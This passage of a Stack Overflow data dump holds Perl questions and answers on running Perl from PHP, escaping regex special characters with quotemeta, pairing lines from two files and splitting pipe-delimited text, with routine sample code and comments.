"https://stackoverflow.com/questions/33625448/execute-perl-script-from-php/33625637#33625637", "title": "Execute perl script from PHP", "body": "<p>Are you using a older version of PHP? If so, you might be runing in safe mode. \nAlso you could check your folder privileges</p>\n\n<p>You can read more about safe mode here <a href=\"http://php.net/manual/en/features.safe-mode.php\" rel=\"nofollow\">Link</a></p>\n"}], "owner": {"reputation": 1, "user_id": 5545616, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1aaa46ad7cfd01dab641a1c1e13c86d3?s=128&d=identicon&r=PG&f=1", "display_name": "Devid", "link": "https://stackoverflow.com/users/5545616/devid"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 1267, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1447238175, "creation_date": 1447143198, "question_id": 33625448, "link": "https://stackoverflow.com/questions/33625448/execute-perl-script-from-php", "title": "Execute perl script from PHP", "body": "<p>I trying to execute perl script from php with the following code:</p>\n\n<pre><code>$command = \"/usr/bin/perl /var/www/html/perl/test.pl 1 2\";\nexec($command, $output);\nvar_dump($output);\n</code></pre>\n\n<p>But never works it.</p>\n\n<p>I tried with system, passthru, exec_shell but script doesn't works.</p>\n\n<p>Can you help me?</p>\n"}, {"tags": ["regex", "string", "perl"], "comments": [{"owner": {"reputation": 11918, "user_id": 5527985, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/CfG3C.png?s=128&g=1", "display_name": "bobble bubble", "link": "https://stackoverflow.com/users/5527985/bobble-bubble"}, "edited": false, "score": 2, "creation_date": 1447141993, "post_id": 33624978, "comment_id": 55024045, "body": "Try <a href=\"http://perldoc.perl.org/functions/quotemeta.html\" rel=\"nofollow noreferrer\">\\Q escape</a>: <code>\\b\\Q$str\\E\\b</code> instead <code>\\b$str\\b</code> <a href=\"https://regex101.com/r/uA4qB3/1\" rel=\"nofollow noreferrer\">see demo</a>."}, {"owner": {"reputation": 481636, "user_id": 3832970, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/64323e6cf08401474da3bf770ea13b58?s=128&d=identicon&r=PG&f=1", "display_name": "Wiktor Stribi\u017cew", "link": "https://stackoverflow.com/users/3832970/wiktor-stribi%c5%bcew"}, "edited": false, "score": 0, "creation_date": 1447143707, "post_id": 33624978, "comment_id": 55024847, "body": "You only need to check for <code>hwsapbc05pvz</code>, no need to include pipes."}], "answers": [{"comments": [{"owner": {"reputation": 21, "user_id": 4809828, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-9VCDfTKuWeE/AAAAAAAAAAI/AAAAAAAAARM/2EyZ6vQlQgU/photo.jpg?sz=128", "display_name": "subhas chandra", "link": "https://stackoverflow.com/users/4809828/subhas-chandra"}, "edited": false, "score": 0, "creation_date": 1447144881, "post_id": 33625488, "comment_id": 55025448, "body": "Thanks man. It working for me. I learnt new regular expression quotemeta"}], "tags": [], "owner": {"reputation": 11918, "user_id": 5527985, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/CfG3C.png?s=128&g=1", "display_name": "bobble bubble", "link": "https://stackoverflow.com/users/5527985/bobble-bubble"}, "is_accepted": false, "score": 1, "last_activity_date": 1447143403, "creation_date": 1447143403, "answer_id": 33625488, "question_id": 33624978, "link": "https://stackoverflow.com/questions/33624978/how-to-match-exact-sentence-with-spaces-and-special-character-in-perl/33625488#33625488", "title": "How to match exact sentence with spaces and special character in perl", "body": "<p>If you include this variable unescaped into the regex, parser uses the pipes</p>\n\n<pre><code>hwsapbc05pvz ps -ef |grep prd | grep -v grep | wc -l\n                    \u2191 OR      \u2191 OR           \u2191 OR\n</code></pre>\n\n<p>giving a match on any matching substring. To match all string literally try <a href=\"http://perldoc.perl.org/functions/quotemeta.html\" rel=\"nofollow\">\\Q escape</a></p>\n\n<pre><code>if($line =~ m/\\b\\Q$str\\E\\b/)\n</code></pre>\n\n<p><a href=\"https://regex101.com/r/uA4qB3/1\" rel=\"nofollow\">See demo at regex101</a> or try using <a href=\"http://perldoc.perl.org/functions/quotemeta.html\" rel=\"nofollow\">quotemeta</a> <code>my $escaped_str = quotemeta($str);</code></p>\n"}, {"comments": [{"owner": {"reputation": 21, "user_id": 4809828, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-9VCDfTKuWeE/AAAAAAAAAAI/AAAAAAAAARM/2EyZ6vQlQgU/photo.jpg?sz=128", "display_name": "subhas chandra", "link": "https://stackoverflow.com/users/4809828/subhas-chandra"}, "edited": false, "score": 0, "creation_date": 1447145000, "post_id": 33625489, "comment_id": 55025513, "body": "Thanks man, its working fine. However, i cannot use this, because, i am fetching the matching string &quot;$str&quot; from excel sheet. To add escape character for &quot;|&quot;, i have to write another function. So i used quotemeta."}], "tags": [], "owner": {"reputation": 631, "user_id": 5530129, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/eb0401e0fbf0c764e96c2406182d9aa6?s=128&d=identicon&r=PG", "display_name": "balabhi", "link": "https://stackoverflow.com/users/5530129/balabhi"}, "is_accepted": false, "score": 1, "last_activity_date": 1447143407, "creation_date": 1447143407, "answer_id": 33625489, "question_id": 33624978, "link": "https://stackoverflow.com/questions/33624978/how-to-match-exact-sentence-with-spaces-and-special-character-in-perl/33625489#33625489", "title": "How to match exact sentence with spaces and special character in perl", "body": "<p>The \"|\" in your pattern need to be escaped by backslash, and the $str need to have qr in the beginning. Change the 5th line of you script, and it worked on my environment.  </p>\n\n<pre><code>my $str = qr\"hwsapbc05pvz ps -ef \\|grep prd \\| grep -v grep \\| wc -l\";  \n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 882, "user_id": 3965075, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/FLP7B.jpg?s=128&g=1", "display_name": "Praveen", "link": "https://stackoverflow.com/users/3965075/praveen"}, "is_accepted": false, "score": 1, "last_activity_date": 1447156624, "creation_date": 1447156624, "answer_id": 33629449, "question_id": 33624978, "link": "https://stackoverflow.com/questions/33624978/how-to-match-exact-sentence-with-spaces-and-special-character-in-perl/33629449#33629449", "title": "How to match exact sentence with spaces and special character in perl", "body": "<p>subhas Chandra : I have modified your code and have posted it below. This should work fine now.</p>\n\n<pre><code>use strict;\nuse warnings;\nmy $infile = \"Input.txt\";\nmy $outfile = \"Output.txt\";\nopen(FH, \"&lt;$infile\") or die \"File not found\";\nopen(OP, \"&gt;$outfile\") or die \"Output File not found\";\nmy $str = \"hwsapbc05pvz ps -ef |grep prd | grep -v grep | wc -l\"; # which should only match 6th line from text document\nmy $finalstr = quotemeta($str);\nwhile(&lt;FH&gt;)\n{\nmy $line = $_;\nchomp($line);\nif($line =~ m/$finalstr/)\n   {\n    print OP \"$line\\n\";\n   }\n}\nclose FH;\nclose OP;\n</code></pre>\n"}], "owner": {"reputation": 21, "user_id": 4809828, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-9VCDfTKuWeE/AAAAAAAAAAI/AAAAAAAAARM/2EyZ6vQlQgU/photo.jpg?sz=128", "display_name": "subhas chandra", "link": "https://stackoverflow.com/users/4809828/subhas-chandra"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 698, "favorite_count": 0, "answer_count": 3, "score": 1, "last_activity_date": 1447156624, "creation_date": 1447141211, "last_edit_date": 1447141576, "question_id": 33624978, "link": "https://stackoverflow.com/questions/33624978/how-to-match-exact-sentence-with-spaces-and-special-character-in-perl", "title": "How to match exact sentence with spaces and special character in perl", "body": "<p>I am beginner in Perl Regular expression. I am reading contents from a text document and trying to extract the line which exactly matches the required string containing spaces and special characters which is \"hwsapbc05pvz ps -ef |grep prd | grep -v grep | wc -l\". Below is contents from the text document</p>\n\n<pre><code>spawn ssh -t -q -o StrictHostKeyChecking=no hwldbbc01pvs ps -ef |grep mysqld | grep -v grep | wc -l\nspawn ssh -t -q -o StrictHostKeyChecking=no hwsapbc01pvb ps -ef |grep prd | grep -v grep | wc -l\nspawn ssh -t -q -o StrictHostKeyChecking=no hwsapbc02pvc ps -ef |grep prd | grep -v grep | wc -l\nspawn ssh -t -q -o StrictHostKeyChecking=no hwsapbc03pvg ps -ef |grep prd | grep -v grep | wc -l\nspawn ssh -t -q -o StrictHostKeyChecking=no hwsapbc04pvv ps -ef |grep prd | grep -v grep | wc -l\nspawn ssh -t -q -o StrictHostKeyChecking=no hwsapbc05pvz ps -ef |grep prd | grep -v grep | wc -l\nspawn ssh -t -q -o StrictHostKeyChecking=no hwadbgw31pvv ps -ef |grep OpenDeploy | grep -v grep | wc -l\nspawn ssh -t -q -o StrictHostKeyChecking=no hwadbgw32pve ps -ef |grep OpenDeploy | grep -v grep | wc -l\nspawn ssh -t -q -o StrictHostKeyChecking=no hwawbgw01pvy ps -ef |grep sayt.*4150 | grep -v grep | wc -l\n</code></pre>\n\n<p>I have written the code</p>\n\n<pre><code>my $infile = \"InputTextDoc.txt\";\nmy $outfile = \"Output.txt\";\nopen(FH, \"&lt;$infile\") or die \"File not found\";\nopen(OP, \"&gt;$outfile\") or die \"Output File not found\";\nmy $str = \"hwsapbc05pvz ps -ef |grep prd | grep -v grep | wc -l\"; # which should only match 6th line from text document\nwhile(&lt;FH&gt;)\n{\n$line = $_;\nchomp($line);\nif($line =~ m/\\b$str\\b/)\n   {\n    print OP \"$line\\n\";\n   }\n}\nclose FH;\nclose OP;\n</code></pre>\n\n<p>Since ps -ef exists in all lines its matching all lines. However, entire string \"hwsapbc05pvz ps -ef |grep prd | grep -v grep | wc -l\" unique in text document.\nHow to match exact string.Please help. Thanks in advance</p>\n"}, {"tags": ["perl", "text-processing"], "comments": [{"owner": {"reputation": 6258, "user_id": 82262, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8ce15931410b388a52eb2df4a864137f?s=128&d=identicon&r=PG&f=1", "display_name": "Matt Jacob", "link": "https://stackoverflow.com/users/82262/matt-jacob"}, "edited": false, "score": 1, "creation_date": 1447130597, "post_id": 33622863, "comment_id": 55020199, "body": "Can you edit your post to include what you&#39;ve tried so far? Also, where does the tab-delimited part come into play? I only see one value per line..."}, {"owner": {"reputation": 6258, "user_id": 82262, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8ce15931410b388a52eb2df4a864137f?s=128&d=identicon&r=PG&f=1", "display_name": "Matt Jacob", "link": "https://stackoverflow.com/users/82262/matt-jacob"}, "edited": false, "score": 0, "creation_date": 1447132110, "post_id": 33622863, "comment_id": 55020630, "body": "Thanks for adding your existing code. I&#39;m still confused about your explanation of tab-delimited, though: delimited implies a delimiter. For example, you&#39;ve got <code>line\\nline\\nline</code>. When someone says <i>delimited</i>, I would expect to see <code>field\\tfield\\tfield\\n</code> or <code>field,field,field\\n</code>."}, {"owner": {"reputation": 6258, "user_id": 82262, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8ce15931410b388a52eb2df4a864137f?s=128&d=identicon&r=PG&f=1", "display_name": "Matt Jacob", "link": "https://stackoverflow.com/users/82262/matt-jacob"}, "edited": false, "score": 1, "creation_date": 1447132318, "post_id": 33622863, "comment_id": 55020701, "body": "One more thing... in your question, you said lines 1-1000 of the second file. Did you mean all lines, or did you really mean lines 1-1000? (There&#39;s a small difference in the logic, i.e., stopping after line 1000.)"}, {"owner": {"reputation": 71, "user_id": 4142921, "user_type": "registered", "accept_rate": 8, "profile_image": "https://www.gravatar.com/avatar/858f3677717260e9b3e166eda3026020?s=128&d=identicon&r=PG&f=1", "display_name": "tlialin", "link": "https://stackoverflow.com/users/4142921/tlialin"}, "reply_to_user": {"reputation": 6258, "user_id": 82262, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8ce15931410b388a52eb2df4a864137f?s=128&d=identicon&r=PG&f=1", "display_name": "Matt Jacob", "link": "https://stackoverflow.com/users/82262/matt-jacob"}, "edited": false, "score": 0, "creation_date": 1447135566, "post_id": 33622863, "comment_id": 55021650, "body": "Re tab delimited I&#39;m wrong you are right.  I&#39;m just line\\nline\\nline."}, {"owner": {"reputation": 71, "user_id": 4142921, "user_type": "registered", "accept_rate": 8, "profile_image": "https://www.gravatar.com/avatar/858f3677717260e9b3e166eda3026020?s=128&d=identicon&r=PG&f=1", "display_name": "tlialin", "link": "https://stackoverflow.com/users/4142921/tlialin"}, "reply_to_user": {"reputation": 6258, "user_id": 82262, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8ce15931410b388a52eb2df4a864137f?s=128&d=identicon&r=PG&f=1", "display_name": "Matt Jacob", "link": "https://stackoverflow.com/users/82262/matt-jacob"}, "edited": false, "score": 0, "creation_date": 1447135584, "post_id": 33622863, "comment_id": 55021654, "body": "I meant all lines not just 1-1000. Thanks."}, {"owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "edited": false, "score": 1, "creation_date": 1447150636, "post_id": 33622863, "comment_id": 55028911, "body": "This is sounding a bit like an <a href=\"http://meta.stackexchange.com/questions/66377/what-is-the-xy-problem\">XY Problem</a> - what is this auxiliary script you&#39;re calling?"}], "answers": [{"comments": [{"owner": {"reputation": 71, "user_id": 4142921, "user_type": "registered", "accept_rate": 8, "profile_image": "https://www.gravatar.com/avatar/858f3677717260e9b3e166eda3026020?s=128&d=identicon&r=PG&f=1", "display_name": "tlialin", "link": "https://stackoverflow.com/users/4142921/tlialin"}, "edited": false, "score": 0, "creation_date": 1447131967, "post_id": 33623134, "comment_id": 55020596, "body": "Thanks very much Matt.  I&#39;ve edited my post with the details that you asked for and will try to use what you&#39;ve provided."}, {"owner": {"reputation": 6258, "user_id": 82262, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8ce15931410b388a52eb2df4a864137f?s=128&d=identicon&r=PG&f=1", "display_name": "Matt Jacob", "link": "https://stackoverflow.com/users/82262/matt-jacob"}, "reply_to_user": {"reputation": 71, "user_id": 4142921, "user_type": "registered", "accept_rate": 8, "profile_image": "https://www.gravatar.com/avatar/858f3677717260e9b3e166eda3026020?s=128&d=identicon&r=PG&f=1", "display_name": "tlialin", "link": "https://stackoverflow.com/users/4142921/tlialin"}, "edited": false, "score": 0, "creation_date": 1447138211, "post_id": 33623134, "comment_id": 55022564, "body": "@tlialin No problem. If you believe it&#39;s a good solution to your problem, you should <a href=\"http://stackoverflow.com/help/someone-answers\">accept it</a>."}, {"owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "edited": false, "score": 0, "creation_date": 1447150503, "post_id": 33623134, "comment_id": 55028830, "body": "I&#39;m assuming the seek/re-read approach is to save reading the file into memory? I&#39;m not sure that isn&#39;t a premature optimisation given that order of magnitude - 1000 lines of a few bytes isn&#39;t much of a memory footprint."}, {"owner": {"reputation": 6258, "user_id": 82262, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8ce15931410b388a52eb2df4a864137f?s=128&d=identicon&r=PG&f=1", "display_name": "Matt Jacob", "link": "https://stackoverflow.com/users/82262/matt-jacob"}, "reply_to_user": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "edited": false, "score": 0, "creation_date": 1447167946, "post_id": 33623134, "comment_id": 55039599, "body": "@Sobrique In this case, sure. But you know how these things go. In this example, it&#39;s 1000 lines, but in real life, it&#39;s 100,000,000 lines and now we&#39;re OOM."}], "tags": [], "owner": {"reputation": 6258, "user_id": 82262, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8ce15931410b388a52eb2df4a864137f?s=128&d=identicon&r=PG&f=1", "display_name": "Matt Jacob", "link": "https://stackoverflow.com/users/82262/matt-jacob"}, "is_accepted": false, "score": 1, "last_activity_date": 1447131242, "creation_date": 1447131242, "answer_id": 33623134, "question_id": 33622863, "link": "https://stackoverflow.com/questions/33622863/read-from-two-files-and-print-line1-from-file-1-all-lines-from-file2-and-do-th/33623134#33623134", "title": "Read from two files and print line1 from file 1 + all lines from file2 and do that for all lines in file 1", "body": "<p>You say that your files are tab-delimited, but I don't see any tabs in your sample input, so I'm going to go with that for now.</p>\n\n<pre><code>use strict;\nuse warnings;\n\nopen(my $fh, '&lt;', 'cities.tsv') or die $!;\nchomp(my @cities = &lt;$fh&gt;);\nclose($fh);\n\nopen($fh, '&lt;', 'adjectives.tsv') or die $!;\n\nfor my $city (@cities) {\n    seek($fh, 0, 0);\n\n    while (my $adjective = &lt;$fh&gt;) {\n        chomp($adjective);\n        print \"$city $adjective\\n\";\n    }   \n}\n\nclose($fh);\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "edited": false, "score": 1, "creation_date": 1447149858, "post_id": 33626119, "comment_id": 55028431, "body": "This question is tagged as <code>perl</code> but your answer isn&#39;t. It&#39;s probably worth  clarifying why you&#39;ve suggested this approach."}, {"owner": {"reputation": 12227, "user_id": 4158274, "user_type": "registered", "accept_rate": 73, "profile_image": "https://i.stack.imgur.com/XUls9.jpg?s=128&g=1", "display_name": "Ken Benoit", "link": "https://stackoverflow.com/users/4158274/ken-benoit"}, "reply_to_user": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "edited": false, "score": 0, "creation_date": 1447151842, "post_id": 33626119, "comment_id": 55029666, "body": "Apologies, you are right. I thought this could include R."}, {"owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "edited": false, "score": 0, "creation_date": 1447154124, "post_id": 33626119, "comment_id": 55030903, "body": "It could - I don&#39;t necessarily think &#39;use a different tool&#39; is an incorrect answer. It&#39;s just it helps if it also includes a reason why a screwdriver is better than a hammer in this scenario."}], "tags": [], "owner": {"reputation": 12227, "user_id": 4158274, "user_type": "registered", "accept_rate": 73, "profile_image": "https://i.stack.imgur.com/XUls9.jpg?s=128&g=1", "display_name": "Ken Benoit", "link": "https://stackoverflow.com/users/4158274/ken-benoit"}, "is_accepted": false, "score": 1, "last_activity_date": 1447151879, "last_edit_date": 1447151879, "creation_date": 1447145778, "answer_id": 33626119, "question_id": 33622863, "link": "https://stackoverflow.com/questions/33622863/read-from-two-files-and-print-line1-from-file-1-all-lines-from-file2-and-do-th/33626119#33626119", "title": "Read from two files and print line1 from file 1 + all lines from file2 and do that for all lines in file 1", "body": "<p>Here's a quick way to do this in R:</p>\n\n<pre><code>&gt; file1 &lt;- readLines(\"file1.txt\")\n&gt; file2 &lt;- readLines(\"file2.txt\")\n&gt; writeLines(sort(as.character(outer(file1, file2, paste))))\nSan Diego groovy\nSan Diego hot\nSan Diego windy\nSan Francisco groovy\nSan Francisco hot\nSan Francisco windy\nSan Mateo groovy\nSan Mateo hot\nSan Mateo windy\n</code></pre>\n\n<p>If you want to write these to a file, use the <code>con</code> argument in <code>writeLines()</code>.</p>\n"}], "owner": {"reputation": 71, "user_id": 4142921, "user_type": "registered", "accept_rate": 8, "profile_image": "https://www.gravatar.com/avatar/858f3677717260e9b3e166eda3026020?s=128&d=identicon&r=PG&f=1", "display_name": "tlialin", "link": "https://stackoverflow.com/users/4142921/tlialin"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 91, "favorite_count": 0, "answer_count": 2, "score": 1, "last_activity_date": 1447151879, "creation_date": 1447129598, "last_edit_date": 1447131762, "question_id": 33622863, "link": "https://stackoverflow.com/questions/33622863/read-from-two-files-and-print-line1-from-file-1-all-lines-from-file2-and-do-th", "title": "Read from two files and print line1 from file 1 + all lines from file2 and do that for all lines in file 1", "body": "<p>I have two tab delimited text files, one with city names the other with descriptions.  I'm trying to read line 1 from file one and combine it with lines 1-1000 in file 2 and print the combined lines one at a time.  I'd like to do this for each line of file 1.</p>\n\n<p>Example File 1:</p>\n\n<pre><code>San Francisco\nSan Diego\nSan Mateo\n</code></pre>\n\n<p>Example File 2:</p>\n\n<pre><code>groovy\nwindy\nhot\n</code></pre>\n\n<p>Desired output:</p>\n\n<pre><code>San Francisco groovy\nSan Francisco windy\nSan Francisco hot\nSan Diego groovy\nSan Diego windy\nSan Diego hot\nSan Mateo groovy\nSan Mateo windy\nSan Mateo hot\n</code></pre>\n\n<p>I've written something that can step through one file and read it and I have written multiple scripts with hard coded descriptions and have a .bat/.command file that I can run to run like 30 scripts to cover my parameters but I'm thinking there has got to be an easier way.\nI'm opening files and chomping right now with a while loop but maybe this is not the best way to get the results I'm trying to get.\nAny help would be greatly appreciated.</p>\n\n<p>What I have is this:</p>\n\n<pre><code>open (my $fh2, \"cities.txt\")\nor die \"Could not open file\";\nmkdir 'Output', 0755;\n\nwhile (my $row = &lt;$fh2&gt;){ \n    print $row;\nif ($row ne \"end\\n\"){\n\nchomp $row;\nprint \"$row\\n\";\n\nelse {\n    close $fh2;\n        die;\n}\n\n}\n</code></pre>\n\n<p>I'm using set variables called v1 and combining using : $v1.$row to print both variables but I need 1 script per variable.</p>\n\n<p>Tab delimited text is always what I've been told to use as a data source but it can rally be an delimited text file.</p>\n"}, {"tags": ["regex", "string", "perl", "string-split", "delimited-text"], "comments": [{"owner": {"reputation": 61610, "user_id": 725418, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/82ac2dc3e1ad4b7187f245c416528df9?s=128&d=identicon&r=PG", "display_name": "TLP", "link": "https://stackoverflow.com/users/725418/tlp"}, "edited": false, "score": 1, "creation_date": 1447123252, "post_id": 33621893, "comment_id": 55018320, "body": "You forgot to escape the first pipe <code>|</code>."}], "answers": [{"comments": [{"owner": {"reputation": 61610, "user_id": 725418, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/82ac2dc3e1ad4b7187f245c416528df9?s=128&d=identicon&r=PG", "display_name": "TLP", "link": "https://stackoverflow.com/users/725418/tlp"}, "edited": false, "score": 0, "creation_date": 1447125830, "post_id": 33621969, "comment_id": 55018946, "body": "This would turn <code>build1        | </code> into <code>&quot;build1&quot;, &quot;&quot;, &quot;&quot;, &quot;&quot;, &quot;&quot;, &quot;&quot;, ...</code> with one field for each space. You want <code>&#39; &#39;</code> -- a single literal space. Or <code>&#47; +&#47;</code>, or <code>&#47;\\s+&#47;</code>."}], "tags": [], "owner": {"reputation": 123, "user_id": 5544668, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-Y9hjar4QYTU/AAAAAAAAAAI/AAAAAAAAAAA/a5qZJJ4HGqU/photo.jpg?sz=128", "display_name": "Maddy", "link": "https://stackoverflow.com/users/5544668/maddy"}, "is_accepted": false, "score": 0, "last_activity_date": 1447123178, "creation_date": 1447123178, "answer_id": 33621969, "question_id": 33621893, "link": "https://stackoverflow.com/questions/33621893/perl-extract-substrings-between-2-delimiters/33621969#33621969", "title": "perl extract substrings between 2 delimiters", "body": "<p>Consider using the split function. Below is one example where delimeter is space, you can replace it with '|' pipe symbol.</p>\n\n<pre><code>my $str = \"ab cd ef gh ij\";\nmy @words = split / /, $str;\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 6258, "user_id": 82262, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8ce15931410b388a52eb2df4a864137f?s=128&d=identicon&r=PG&f=1", "display_name": "Matt Jacob", "link": "https://stackoverflow.com/users/82262/matt-jacob"}, "edited": false, "score": 1, "creation_date": 1447124471, "post_id": 33622060, "comment_id": 55018618, "body": "Useless use of <code>cat</code> here. The diamond operator does the same thing when <code>@ARGV</code> contains a list of filenames."}, {"owner": {"reputation": 137, "user_id": 3118672, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/7QNWI.jpg?s=128&g=1", "display_name": "damseldeebi", "link": "https://stackoverflow.com/users/3118672/damseldeebi"}, "edited": false, "score": 0, "creation_date": 1447124649, "post_id": 33622060, "comment_id": 55018660, "body": "<code>\\s+</code> did the trick. I was trying to match start and end and extract string in between."}, {"owner": {"reputation": 6258, "user_id": 82262, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8ce15931410b388a52eb2df4a864137f?s=128&d=identicon&r=PG&f=1", "display_name": "Matt Jacob", "link": "https://stackoverflow.com/users/82262/matt-jacob"}, "edited": false, "score": 0, "creation_date": 1447131773, "post_id": 33622060, "comment_id": 55020547, "body": "Also, the first argument to <code>split()</code> absolutely can be a string---in fact, there are a couple special cases for the empty string (<code>&#39;&#39;</code>) and a string containing a single space (<code>&#39; &#39;</code>)."}], "tags": [], "owner": {"reputation": 1901, "user_id": 2002471, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/222d816f24fcb2d01e92937b6af01d34?s=128&d=identicon&r=PG", "display_name": "chicks", "link": "https://stackoverflow.com/users/2002471/chicks"}, "is_accepted": true, "score": 2, "last_activity_date": 1447123928, "creation_date": 1447123928, "answer_id": 33622060, "question_id": 33621893, "link": "https://stackoverflow.com/questions/33621893/perl-extract-substrings-between-2-delimiters/33622060#33622060", "title": "perl extract substrings between 2 delimiters", "body": "<p>As Maddy and sebnukem mentioned, split is the answer.  Using just regex's for this is doable, but more complicated because of the lack of pipes (<code>|</code>) at the beginning and end of your lines.  Here's a script that reads through your data file:</p>\n\n<pre><code>#!/usr/bin/perl\n\nuse strict;\nuse warnings;\nuse Data::Dumper;\n\nforeach my $line (&lt;&gt;) {\n#   print $line;\n    chomp($line);\n    next unless $line =~ /\\|/; # only try lines with pipes in them\n    my @fields = split(/\\s+\\|/,$line);\n    print Dumper(\\@fields);\n}\n</code></pre>\n\n<p>Here is an example of running it:</p>\n\n<pre><code>chicks$ cat data.txt | ./proc_data.pl \n$VAR1 = [\n          'Jobs',\n          'Status',\n          'Wait Reason',\n          'Wait Local',\n          'Wait Remote',\n          'Running',\n          'Passing',\n          'Failing',\n          'Skipped',\n          'Failures '\n        ];\n$VAR1 = [\n          'build1',\n          'FAILED',\n          '',\n          '',\n          '',\n          '',\n          '      8',\n          '     5',\n          '',\n          '         '\n        ];\n$VAR1 = [\n          'build2                `',\n          'PASSED',\n          '',\n          '',\n          '',\n          '',\n          '      2',\n          '',\n          '',\n          '         '\n        ];\n$VAR1 = [\n          'build3',\n          'PASSED',\n          '',\n          '',\n          '',\n          '',\n          '      6',\n          '',\n          '',\n          '        '\n        ];\n</code></pre>\n\n<p>Note that the <code>split</code> puts the regex in slashes, not quotes and the backslash must be escaped: <code>\\|</code>.  I also included a <code>\\s+</code> to trim spaces from the right side of the results.  A <code>\\s+</code> on the other side of the regex would get the left side spaces like in <code>'     6'</code>.  If you want it to match 0 or more spaces you should use the <code>*</code> instead of <code>+</code> in those places.</p>\n"}], "owner": {"reputation": 137, "user_id": 3118672, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/7QNWI.jpg?s=128&g=1", "display_name": "damseldeebi", "link": "https://stackoverflow.com/users/3118672/damseldeebi"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 776, "favorite_count": 0, "accepted_answer_id": 33622060, "answer_count": 2, "score": 1, "last_activity_date": 1447123928, "creation_date": 1447122648, "last_edit_date": 1447123921, "question_id": 33621893, "link": "https://stackoverflow.com/questions/33621893/perl-extract-substrings-between-2-delimiters", "title": "perl extract substrings between 2 delimiters", "body": "<p>I have a file similar to one below.</p>\n\n<pre>\nJobs                             |Status |Wait Reason |Wait Local |Wait Remote |Running |Passing |Failing |Skipped |Failures \n--------------------------------- ------- ------------ ----------- ------------ -------- -------- -------- -------- ---------\nbuild1                           |FAILED |            |           |            |        |      8 |     5  |        |         \nbuild2                `          |PASSED |            |           |            |        |      2 |        |        |         \nbuild3                           |PASSED |            |           |            |        |      6 |        |        |        \n</pre>\n\n<p>I need to extract the substrings between the delimiter <strong>'|'</strong>. I tried using the below regex </p>\n\n<p><code>$row=~ s/ //g;\n(@substrings)= $row =~ /|(.*?)\\|/g;</code></p>\n\n<p>the result was </p>\n\n<pre><code>0 :\n1 : build1\n2 :\n3 : FAILED\n4 :\n5 :\n6 :\n7 :\n8 :\n..\n</code></pre>\n\n<p>I also used the split function <code>split '|',$row;</code> but it returned data as</p>\n\n<pre><code>b\nu\ni\nl\nd\n1\n\n\n|\nF\n..\n</code></pre>\n\n<p>I'm trying to extract the following data.</p>\n\n<pre><code>$substrings[0]=build1\n$substrings[1]=FAILED\n$substrings[2]=(null) \n</code></pre>\n\n<p>and so on.</p>\n\n<p>How to extract the substrings?</p>\n"}, {"tags": ["python", "perl", "encryption", "pycrypto", "blowfish"], "answers": [{"tags": [], "owner": {"reputation": 35, "user_id": 5540257, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/51a26e8fe52c02bfbd16aef7e5071a87?s=128&d=identicon&r=PG&f=1", "display_name": "G&#246;ran Str&#246;m", "link": "https://stackoverflow.com/users/5540257/g%c3%b6ran-str%c3%b6m"}, "is_accepted": false, "score": 0, "last_activity_date": 1447364081, "creation_date": 1447364081, "answer_id": 33681844, "question_id": 33620584, "link": 